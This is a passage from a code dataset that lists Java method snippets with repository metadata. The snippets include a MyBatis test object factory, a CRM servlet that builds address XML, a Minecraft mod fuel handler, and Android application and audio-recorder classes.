classToCreate = resolveInterface(type);\n        @SuppressWarnings(\"unchecked\") // we know types are assignable\n        T created = (T) instantiateClass(classToCreate, constructorArgTypes, constructorArgs);\n        return created;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/CustomObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory"], "modifiers": ["public"]}}, {"id": 56335, "method_name": "instantiateClass", "class_name": "CustomObjectFactory", "params": ["Class<T>", "List<Class>", "List<Object>"], "throws": null, "modifiers": ["private"], "return_type": "T", "snippet": "    private <T> T instantiateClass(Class<T> type, List<Class<?>> constructorArgTypes, List<Object> constructorArgs) {\n        try {\n            Constructor<T> constructor;\n            if (constructorArgTypes == null || constructorArgs == null) {\n                constructor = type.getDeclaredConstructor();\n                if (!constructor.isAccessible()) {\n                    constructor.setAccessible(true);\n                }\n                return constructor.newInstance();\n            }\n            constructor = type.getDeclaredConstructor(constructorArgTypes.toArray(new Class[constructorArgTypes.size()]));\n            if (!constructor.isAccessible()) {\n                constructor.setAccessible(true);\n            }\n            return constructor.newInstance(constructorArgs.toArray(new Object[constructorArgs.size()]));\n        } catch (Exception e) {\n            StringBuilder argTypes = new StringBuilder();\n            if (constructorArgTypes != null) {\n                for (Class<?> argType : constructorArgTypes) {\n                    argTypes.append(argType.getSimpleName());\n                    argTypes.append(\",\");\n                }\n            }\n            StringBuilder argValues = new StringBuilder();\n            if (constructorArgs != null) {\n                for (Object argValue : constructorArgs) {\n                    argValues.append(String.valueOf(argValue));\n                    argValues.append(\",\");\n                }\n            }\n            throw new ReflectionException(\"Error instantiating \" + type + \" with invalid types (\" + argTypes + \") or values (\" + argValues + \"). Cause: \" + e, e);\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/CustomObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory"], "modifiers": ["public"]}}, {"id": 56336, "method_name": "resolveInterface", "class_name": "CustomObjectFactory", "params": ["Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "Class<?>", "snippet": "    private Class<?> resolveInterface(Class<?> type) {\n        Class<?> classToCreate;\n        if (type == List.class || type == Collection.class) {\n            classToCreate = LinkedList.class;\n        } else if (type == Map.class) {\n            classToCreate = LinkedHashMap.class;\n        } else if (type == SortedSet.class) { // issue #510 Collections Support\n            classToCreate = TreeSet.class;\n        } else if (type == Set.class) {\n            classToCreate = HashSet.class;\n        } else {\n            classToCreate = type;\n        }\n        return classToCreate;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/CustomObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory"], "modifiers": ["public"]}}, {"id": 56337, "method_name": "isCollection", "class_name": "CustomObjectFactory", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public <T> boolean isCollection(Class<T> type) {\n      return CustomCollection.class.isAssignableFrom(type);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/CustomObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory"], "modifiers": ["public"]}}, {"id": 56338, "method_name": "createArray", "class_name": "CustomObjectFactory", "params": ["Class<T>", "int"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T[] createArray(Class<T> type, int size) {\n      return (T[]) Array.newInstance(type, size);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/CustomObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory"], "modifiers": ["public"]}}, {"id": 56339, "method_name": "doGet", "class_name": "GetUpdatedAddressObjects", "params": ["HttpServletRequest", "HttpServletResponse"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void doGet( HttpServletRequest httpServletRequest, HttpServletResponse response )\n    {\n        long time;\n        try\n        {\n            time = Long.parseLong( (String) httpServletRequest.getParameter( \"time\" ) );\n        }\n        catch (NumberFormatException ex)\n        {\n            time = 0;\n        }\n        String selectedCities = httpServletRequest.getParameter( \"city\" );\n        if ( log.isDebugEnabled() )\n        {\n        \tlog.debug( \"time=\" + httpServletRequest.getParameter( \"time\" ) + \"; selectedCities=\" + selectedCities );\n        }\n        \n        List<AddressCity> cities = new ArrayList<AddressCity>();\n        List<AddressItem> areas = new ArrayList<AddressItem>();\n        List<AddressItem> quarters = new ArrayList<AddressItem>();\n        List<AddressItem> streets = new ArrayList<AddressItem>();\n        List<AddressCountry> countries = new ArrayList<AddressCountry>();\n        List<AddressHouse> houses = new ArrayList<AddressHouse>();\n        \n        Connection con = setup.getDBConnectionFromPool();\n\t\ttry \n\t\t{\n\t\t\tAddressDAO addressDAO = new AddressDAO( con );\n\t\t\t//\u0435\u0441\u043b\u0438 \u043d\u0435 \u0437\u0430\u0434\u0430\u043d\u044b \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u044b\u0435 \u0433\u043e\u0440\u043e\u0434\u0430\n\t\t\t//\u0432\u044b\u0431\u0438\u0440\u0430\u0435\u043c \u0432\u0441\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u044b \u0441\u043e\u0433\u043b\u0430\u0441\u043d\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0438 time\n\t\t\tint[] citiesId = null;\n\t\t\tint[] countriesId = null;\n\t\t\tif (selectedCities != null)\n\t\t\t{\n\t\t\t\tcitiesId = getCitiesId( selectedCities );\n\t\t\t\tList<Integer> countryIdList = addressDAO.getCountryIdByCityId( citiesId );\n\t\t\t\tcountriesId = new int[countryIdList.size()];\n\t\t\t\tint i = 0;\n\t\t\t\tfor ( Integer id : countryIdList )\n\t\t\t\t{\n\t\t\t\t\tcountriesId[i++] = id.intValue();\n\t\t\t\t}\n\t\t\t}\n\t\t\tcountries = addressDAO.getUpdatedCountries( time, countriesId );\n\t\t\tcities = addressDAO.getUpdatedCities( time, citiesId );\n\t\t\tareas = addressDAO.getUpdatedAreas( time, citiesId );\n\t\t\tquarters = addressDAO.getUpdatedQuarters( time, citiesId );\n\t\t\tstreets = addressDAO.getUpdatedStreets( time, citiesId );\n\t\t\thouses = addressDAO.getUpdatedHouses( time, citiesId );\n\t\t} \n\t\tcatch ( Exception e ) \n\t\t{\n\t\t\tlog.error( e.getMessage(), e );\n\t\t}\n\t\tfinally\n\t\t{\n\t\t\tSQLUtils.closeConnection( con );\n\t\t}   \n                \n        Document document = buildXMLDocument( countries, cities, areas, quarters, streets, houses );\n        putDocumentToResponse( response, document );\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/GetUpdatedAddressObjects.java", "stars": "12", "class_props": {"extends": "BaseServlet", "implements": null, "modifiers": ["public"]}}, {"id": 56340, "method_name": "buildXMLDocument", "class_name": "GetUpdatedAddressObjects", "params": ["List<AddressCountry>", "List<AddressCity>", "List<AddressItem>", "List<AddressItem>", "List<AddressItem>", "List<AddressHouse>"], "throws": null, "modifiers": ["private"], "return_type": "Document", "snippet": "    private Document buildXMLDocument( List<AddressCountry> countries,\n                                       List<AddressCity> cities,\n                                       List<AddressItem> areas,\n                                       List<AddressItem> quarters,\n                                       List<AddressItem> streets,\n                                       List<AddressHouse> houses )\n    {\n        Document document = null;\n        try\n        {\n            DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder documentBuilder;\n            documentBuilder = documentBuilderFactory.newDocumentBuilder();\n            document = documentBuilder.newDocument();\n            Element rootElement = document.createElement(\"address\");\n            rootElement.setAttribute( \"time\", Long.toString( new Date().getTime() ) );\n            //\n            Element addressAreaElement = document.createElement( \"address_area\" );\n            Element addressCitiesElement = document.createElement( \"address_city\" );\n            Element addressCountriesElement = document.createElement( \"address_country\" );\n            Element addressQuartersElement = document.createElement( \"address_quarter\" );\n            Element addressStreetsElement = document.createElement( \"address_street\" );\n            Element addressHousesElement = document.createElement( \"address_house\" );\n            //\n            Element record;\n            for (AddressCountry country : countries)\n            {\n                record = document.createElement( \"record\" );\n                record.setAttribute( \"id\", Integer.toString( country.getId() ) );\n                record.setAttribute( \"title\", country.getTitle() );\n                addConfigElements( record, document, country.getConfig() );\n                addressCountriesElement.appendChild( record );\n            }  \n            for (AddressCity city : cities)\n            {\n                record = document.createElement( \"record\" );\n                record.setAttribute( \"id\", Integer.toString( city.getId() ) );\n                record.setAttribute( \"title\", city.getTitle() );\n                record.setAttribute( \"countryId\", Integer.toString( city.getCountryId())  );\n                addConfigElements( record, document, city.getConfig() );\n                addressCitiesElement.appendChild( record );\n            }\n            for (AddressItem area : areas)\n            {\n                record = document.createElement( \"record\" );\n                record.setAttribute( \"id\", Integer.toString( area.getId() ) );\n                record.setAttribute( \"title\", area.getTitle() );\n                record.setAttribute( \"cityId\", Integer.toString( area.getCityId() ) );\n                addConfigElements( record, document, area.getConfig() );\n                addressAreaElement.appendChild( record );\n            }\n            for (AddressItem quarter : quarters)\n            {\n                record = document.createElement( \"record\" );\n                record.setAttribute( \"id\", Integer.toString( quarter.getId() ) );\n                record.setAttribute( \"title\", quarter.getTitle() );\n                record.setAttribute( \"cityId\", Integer.toString( quarter.getCityId() ) );\n                addConfigElements( record, document, quarter.getConfig() );\n                addressQuartersElement.appendChild( record );\n            }\n            for (AddressItem street : streets)\n            {\n                record = document.createElement( \"record\" );\n                record.setAttribute( \"id\", Integer.toString( street.getId() ) );\n                record.setAttribute( \"title\", street.getTitle() );\n                record.setAttribute( \"cityId\", Integer.toString( street.getCityId() ) );\n                addConfigElements( record, document, street.getConfig() );\n                addressStreetsElement.appendChild( record );\n            }\n            for (AddressHouse house : houses)\n            {\n                record = document.createElement( \"record\" );\n                record.setAttribute( \"id\", Integer.toString( house.getId() ) );\n                record.setAttribute( \"areaId\", Integer.toString( house.getAreaId() ) );\n                record.setAttribute( \"quarterId\", Integer.toString( house.getQuarterId() ) );\n                record.setAttribute( \"streetId\", Integer.toString( house.getStreetId() ) );\n                record.setAttribute( \"house\", Integer.toString( house.getHouse() ) );\n                record.setAttribute( \"frac\", house.getFrac() );\n                record.setAttribute( \"postIndex\", house.getPostIndex() );\n                record.setAttribute( \"comment\", house.getComment() );\n                \n                // \u0434\u043b\u044f \u0441\u043e\u0432\u043c\u0435\u0441\u0442\u0438\u043c\u043e\u0441\u0442\u0438 \u0441 \u0441\u0438\u043d\u0445\u0440\u043e\u043d\u0438\u0437\u0430\u0442\u043e\u0440\u043e\u043c \u0431\u0438\u043b\u043b\u0438\u043d\u0433\u0430\n                house.getConfig().put( \"s.box.index\", house.getPostIndex() );\n                \n                addConfigElements( record, document, house.getConfig() );\n                addressHousesElement.appendChild( record );\n            }\n            //\n            rootElement.appendChild( addressAreaElement );\n            rootElement.appendChild( addressCitiesElement);\n            rootElement.appendChild( addressCountriesElement );\n            rootElement.appendChild( addressQuartersElement );\n            rootElement.appendChild( addressStreetsElement );\n            rootElement.appendChild( addressHousesElement );\n            //\n            document.appendChild( rootElement );\n        }\n        catch( ParserConfigurationException e )\n        {\n            log.error( \"GetUpdatedAddressObjects.buildXMLDocument\", e );\n        }\n        return document;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/GetUpdatedAddressObjects.java", "stars": "12", "class_props": {"extends": "BaseServlet", "implements": null, "modifiers": ["public"]}}, {"id": 56341, "method_name": "getCitiesId", "class_name": "GetUpdatedAddressObjects", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int[] getCitiesId( String selectedCities )\n    {\n        String[] selectedCitiesId = selectedCities.split( \",\" );\n        int[] citiesId = new int[selectedCitiesId.length];\n        try\n        {\n            for (int i = 0; i < selectedCitiesId.length; i++)\n            {\n                citiesId[i] = Integer.parseInt( selectedCitiesId[i] );\n            }\n        }\n        catch (Exception ex)\n        {\n            citiesId = new int[0];\n        }\n        return citiesId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/GetUpdatedAddressObjects.java", "stars": "12", "class_props": {"extends": "BaseServlet", "implements": null, "modifiers": ["public"]}}, {"id": 56342, "method_name": "addConfigElements", "class_name": "GetUpdatedAddressObjects", "params": ["Element", "Document", "Map<String,String>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void addConfigElements( Element record, Document document, Map<String, String> params)\n    {\n        Element configElement;\n        for (String key : params.keySet())\n        {\n            configElement = document.createElement( \"config\" );\n            configElement.setAttribute( \"name\", key );\n            configElement.setAttribute( \"value\", params.get( key ));\n            record.appendChild( configElement );\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/GetUpdatedAddressObjects.java", "stars": "12", "class_props": {"extends": "BaseServlet", "implements": null, "modifiers": ["public"]}}, {"id": 56343, "method_name": "furnaceFuelBurnTimeEvent", "class_name": "SpruceFuel", "params": ["FurnaceFuelBurnTimeEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void furnaceFuelBurnTimeEvent(FurnaceFuelBurnTimeEvent event) {\n\t\tif (event.getItemStack().getItem() == new ItemStack(SpruceTanBarkBlock.block, (int) (1)).getItem())\n\t\t\tevent.setBurnTime(1600);\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/fuel/SpruceFuel.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 56344, "method_name": "attachBaseContext", "class_name": "MyApplicationBackup", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void attachBaseContext(Context base)\n    {\n        super.attachBaseContext(base);\n        MultiDex.install(this);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/MyApplicationBackup.java", "stars": "10", "class_props": {"extends": "MultiDexApplication", "implements": null, "modifiers": ["public"]}}, {"id": 56345, "method_name": "onCreate", "class_name": "MyApplicationBackup", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate() {\n\n        super.onCreate();\n\n        MyApplicationBackup.context = getApplicationContext();\n        MyApplicationBackup.application = this;\n\n\n\n\n        //LeakCanary.install(this);\n//        ApplicationState.getInstance().setMyApplication(this);\n        Mapbox.getInstance(this,getString(R.string.fake_key));\n        createNotificationChannel();\n\n\n//\n//\n//        OneSignal.startInit(this)\n//                .setNotificationReceivedHandler(new OneSignal.NotificationReceivedHandler() {\n//                    @Override\n//                    public void notificationReceived(OSNotification notification) {\n//\n//\n////                        Log.d(\"one_signal\",notification.toJSONObject().toString());\n//\n//                        Log.d(\"one_signal\",notification.payload.additionalData.toString());\n//\n//                        JSONObject data = notification.payload.additionalData;\n//\n//\n////                        int screenToOpen = -1;\n//                        int notificationType = -1;\n//\n//\n//                        if (data != null) {\n//\n////                            screenToOpen = data.optInt(\"screen_to_open\",-1);\n//                            notificationType = data.optInt(\"notification_type\",-1);\n//\n//\n//\n//\n//                            if(notificationType== MyApplicationCoreNew.ORDER_PLACED ||\n//                                    notificationType== MyApplicationCoreNew.ORDER_PACKED ||\n//                                    notificationType== MyApplicationCoreNew.ORDER_CONFIRMED||\n//                                    notificationType== MyApplicationCoreNew.ORDER_OUT_FOR_DELIVERY)\n//                            {\n//                                PrefBadgeCount.saveBadgeCountOrders(PrefBadgeCount.getBadgeCountOrders(getApplicationContext())+1,\n//                                        getApplicationContext());\n//                            }\n//\n//\n//\n//\n////                            if(notificationType==MyApplicationCoreNew.PICKUP_STARTED ||\n////                                    notificationType== MyApplicationCoreNew.TRIP_STARTED ||\n////                                    notificationType==MyApplicationCoreNew.TRIP_FINISHED ||\n////                                    notificationType==MyApplicationCoreNew.TRIP_CANCELLED_BY_DRIVER)\n////                            {\n////\n////                                PrefBadgeCount.saveBadgeCountCarts(PrefBadgeCount.getBadgeCountCarts(getApplicationContext())+1,\n////                                        getApplicationContext());\n////                            }\n//\n//\n//\n//                            NotificationEvent event = new NotificationEvent(notificationType);\n//                            EventBus.getDefault().post(event);\n//\n//                        }\n//\n//\n//\n//\n//                    }\n//                })\n//                .setNotificationOpenedHandler(new OneSignal.NotificationOpenedHandler() {\n//                    @Override\n//                    public void notificationOpened(OSNotificationOpenResult result) {\n//\n//                        JSONObject data = result.notification.payload.additionalData;\n//\n////                        Gson gson = UtilityFunctions.provideGson();\n////                        OneSignalData oneSignalData= gson.fromJson(data.toString(), OneSignalData.class);\n//\n//                        int screenToOpen = -1;\n//                        int notificationType = -1;\n//\n//\n//                        if (data != null) {\n//                            screenToOpen = data.optInt(\"screen_to_open\",-1);\n//                            notificationType = data.optInt(\"notification_type\",-1);\n//\n//                            if (screenToOpen != -1)\n//                                Log.i(\"one_signal\", \"Screen To Open: \" + String.valueOf(screenToOpen));\n//                            Log.i(\"one_signal\", \"Notificaion Type : \" + String.valueOf(notificationType));\n//                        }\n//\n//\n//\n//\n//                        Intent intent = new Intent(getApplicationContext(), Home.class);\n//                        intent.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);\n//\n//                        intent.putExtra(\"screen_to_open\",screenToOpen);\n//\n//                        startActivity(intent);\n//\n//                        Log.d(\"one_signal\",\"Notification Opened !\");\n//\n//\n//\n//                    }\n//                })\n//                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)\n//                .unsubscribeWhenNotificationsAreDisabled(true)\n//                .init();\n\n\n\n\n//        OneSignal.idsAvailable(new OneSignal.IdsAvailableHandler() {\n//            @Override\n//            public void idsAvailable(String userId, String registrationId) {\n//\n//\n//                Log.d(\"one_signal\", \"User:\" + userId);\n//                Log.d(\"one_signal\", \"registrationId:\" + registrationId);\n//\n//\n//                PrefOneSignal.saveLastToken(getApplicationContext(),userId);\n//                PrefOneSignal.saveToken(getApplicationContext(),userId);\n//\n//\n//\n////                if (PrefGeneral.getServiceURL(getApplicationContext())!=null) {\n////                    startService(new Intent(getApplicationContext(), UpdateOneSignalID.class));\n////                }\n//\n//\n//\n////                getApplicationContext().startService(new Intent(getApplicationContext(), UpdateOneSignalID.class));\n//            }\n//\n//        });\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/MyApplicationBackup.java", "stars": "10", "class_props": {"extends": "MultiDexApplication", "implements": null, "modifiers": ["public"]}}, {"id": 56346, "method_name": "getAppContext", "class_name": "MyApplicationBackup", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Context", "snippet": "    public static Context getAppContext() {\n        return MyApplicationBackup.context;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/MyApplicationBackup.java", "stars": "10", "class_props": {"extends": "MultiDexApplication", "implements": null, "modifiers": ["public"]}}, {"id": 56347, "method_name": "createNotificationChannel", "class_name": "MyApplicationBackup", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void createNotificationChannel() {\n        // Create the NotificationChannel, but only on API 26+ because\n        // the NotificationChannel class is new and not in the support library\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {\n            CharSequence name = getString(R.string.channel_name);\n            String description = getString(R.string.channel_description);\n            int importance = NotificationManager.IMPORTANCE_DEFAULT;\n            NotificationChannel channel = new NotificationChannel(getString(R.string.default_notification_channel_id), name, importance);\n            channel.setDescription(description);\n            // Register the channel with the system; you can't change the importance\n            // or other notification behaviors after this\n            NotificationManager notificationManager = getSystemService(NotificationManager.class);\n            notificationManager.createNotificationChannel(channel);\n        }\n\n\n\n        System.out.println(\"Notification Channel Created !\");\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/MyApplicationBackup.java", "stars": "10", "class_props": {"extends": "MultiDexApplication", "implements": null, "modifiers": ["public"]}}, {"id": 56348, "method_name": "getInstance", "class_name": "AudioRecorder", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "AudioRecorder", "snippet": "    public static AudioRecorder getInstance() {\n        return AudioRecorderHolder.instance;\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56349, "method_name": "createAudio", "class_name": "AudioRecorder", "params": ["String", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void createAudio(String fileName, int audioSource, int sampleRateInHz, int channelConfig, int audioFormat) {\n        // \u83b7\u5f97\u7f13\u51b2\u533a\u5b57\u8282\u5927\u5c0f\n        bufferSizeInBytes = AudioRecord.getMinBufferSize(sampleRateInHz,\n                channelConfig, channelConfig);\n        audioRecord = new AudioRecord(audioSource, sampleRateInHz, channelConfig, audioFormat, bufferSizeInBytes);\n        this.fileName = fileName;\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56350, "method_name": "createDefaultAudio", "class_name": "AudioRecorder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void createDefaultAudio(String fileName) {\n        // \u83b7\u5f97\u7f13\u51b2\u533a\u5b57\u8282\u5927\u5c0f\n        bufferSizeInBytes = AudioRecord.getMinBufferSize(AUDIO_SAMPLE_RATE,\n                AUDIO_CHANNEL, AUDIO_ENCODING);\n        audioRecord = new AudioRecord(AUDIO_INPUT, AUDIO_SAMPLE_RATE, AUDIO_CHANNEL, AUDIO_ENCODING, bufferSizeInBytes);\n        this.fileName = fileName;\n        status = Status.STATUS_READY;\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56351, "method_name": "startRecord", "class_name": "AudioRecorder", "params": ["RecordStreamListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startRecord(final RecordStreamListener listener) {\n\n        if (status == Status.STATUS_NO_READY || TextUtils.isEmpty(fileName)) {\n            throw new IllegalStateException(\"\u5f55\u97f3\u5c1a\u672a\u521d\u59cb\u5316,\u8bf7\u68c0\u67e5\u662f\u5426\u7981\u6b62\u4e86\u5f55\u97f3\u6743\u9650~\");\n        }\n        if (status == Status.STATUS_START) {\n            throw new IllegalStateException(\"\u6b63\u5728\u5f55\u97f3\");\n        }\n        Log.d(\"AudioRecorder\", \"===startRecord===\" + audioRecord.getState());\n        audioRecord.startRecording();\n\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                writeDataTOFile(listener);\n            }\n        }).start();\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56352, "method_name": "pauseRecord", "class_name": "AudioRecorder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pauseRecord() {\n        Log.d(\"AudioRecorder\", \"===pauseRecord===\");\n        if (status != Status.STATUS_START) {\n            throw new IllegalStateException(\"\u6ca1\u6709\u5728\u5f55\u97f3\");\n        } else {\n            audioRecord.stop();\n            status = Status.STATUS_PAUSE;\n        }\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56353, "method_name": "stopRecord", "class_name": "AudioRecorder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stopRecord() {\n        Log.d(\"AudioRecorder\", \"===stopRecord===\");\n        if (status == Status.STATUS_NO_READY || status == Status.STATUS_READY) {\n            throw new IllegalStateException(\"\u5f55\u97f3\u5c1a\u672a\u5f00\u59cb\");\n        } else {\n            audioRecord.stop();\n            status = Status.STATUS_STOP;\n            release();\n        }\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56354, "method_name": "release", "class_name": "AudioRecorder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void release() {\n        Log.d(\"AudioRecorder\", \"===release===\");\n        //\u5047\u5982\u6709\u6682\u505c\u5f55\u97f3\n        try {\n            if (filesName.size() > 0) {\n                List<String> filePaths = new ArrayList<>();\n                for (String fileName : filesName) {\n                    filePaths.add(FileUtil.getPcmFileAbsolutePath(fileName));\n                }\n                //\u6e05\u9664\n                filesName.clear();\n                //\u5c06\u591a\u4e2apcm\u6587\u4ef6\u8f6c\u5316\u4e3awav\u6587\u4ef6\n                mergePCMFilesToWAVFile(filePaths);\n\n            } else {\n                //\u8fd9\u91cc\u7531\u4e8e\u53ea\u8981\u5f55\u97f3\u8fc7filesName.size\u90fd\u4f1a\u5927\u4e8e0,\u6ca1\u5f55\u97f3\u65f6fileName\u4e3anull\n                //\u4f1a\u62a5\u7a7a\u6307\u9488 NullPointerException\n                // \u5c06\u5355\u4e2apcm\u6587\u4ef6\u8f6c\u5316\u4e3awav\u6587\u4ef6\n                //Log.d(\"AudioRecorder\", \"=====makePCMFileToWAVFile======\");\n                //makePCMFileToWAVFile();\n            }\n        } catch (IllegalStateException e) {\n            throw new IllegalStateException(e.getMessage());\n        }\n\n        if (audioRecord != null) {\n            audioRecord.release();\n            audioRecord = null;\n        }\n\n        status = Status.STATUS_NO_READY;\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56355, "method_name": "canel", "class_name": "AudioRecorder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void canel() {\n        filesName.clear();\n        fileName = null;\n        if (audioRecord != null) {\n            audioRecord.release();\n            audioRecord = null;\n        }\n\n        status = Status.STATUS_NO_READY;\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56356, "method_name": "writeDataTOFile", "class_name": "AudioRecorder", "params": ["RecordStreamListener"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void writeDataTOFile(RecordStreamListener listener) {\n        // new\u4e00\u4e2abyte\u6570\u7ec4\u7528\u6765\u5b58\u4e00\u4e9b\u5b57\u8282\u6570\u636e\uff0c\u5927\u5c0f\u4e3a\u7f13\u51b2\u533a\u5927\u5c0f\n        byte[] audiodata = new byte[bufferSizeInBytes];\n\n        FileOutputStream fos = null;\n        int readsize = 0;\n        try {\n            String currentFileName = fileName;\n            if (status == Status.STATUS_PAUSE) {\n                //\u5047\u5982\u662f\u6682\u505c\u5f55\u97f3 \u5c06\u6587\u4ef6\u540d\u540e\u9762\u52a0\u4e2a\u6570\u5b57,\u9632\u6b62\u91cd\u540d\u6587\u4ef6\u5185\u5bb9\u88ab\u8986\u76d6\n                currentFileName += filesName.size();\n\n            }\n            filesName.add(currentFileName);\n            File file = new File(FileUtil.getPcmFileAbsolutePath(currentFileName));\n            if (file.exists()) {\n                file.delete();\n            }\n            fos = new FileOutputStream(file);// \u5efa\u7acb\u4e00\u4e2a\u53ef\u5b58\u53d6\u5b57\u8282\u7684\u6587\u4ef6\n        } catch (IllegalStateException e) {\n            Log.e(\"AudioRecorder\", e.getMessage());\n            throw new IllegalStateException(e.getMessage());\n        } catch (FileNotFoundException e) {\n            Log.e(\"AudioRecorder\", e.getMessage());\n\n        }\n        //\u5c06\u5f55\u97f3\u72b6\u6001\u8bbe\u7f6e\u6210\u6b63\u5728\u5f55\u97f3\u72b6\u6001\n        status = Status.STATUS_START;\n        while (status == Status.STATUS_START) {\n            readsize = audioRecord.read(audiodata, 0, bufferSizeInBytes);\n            if (AudioRecord.ERROR_INVALID_OPERATION != readsize && fos != null) {\n                try {\n                    fos.write(audiodata);\n                    if (listener != null) {\n                        //\u7528\u4e8e\u62d3\u5c55\u4e1a\u52a1\n                        listener.recordOfByte(audiodata, 0, audiodata.length);\n                    }\n                } catch (IOException e) {\n                    Log.e(\"AudioRecorder\", e.getMessage());\n                }\n            }\n        }\n        try {\n            if (fos != null) {\n                fos.close();// \u5173\u95ed\u5199\u5165\u6d41\n            }\n        } catch (IOException e) {\n            Log.e(\"AudioRecorder\", e.getMessage());\n        }\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56357, "method_name": "mergePCMFilesToWAVFile", "class_name": "AudioRecorder", "params": ["List<String>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void mergePCMFilesToWAVFile(final List<String> filePaths) {\n        new Thread(new 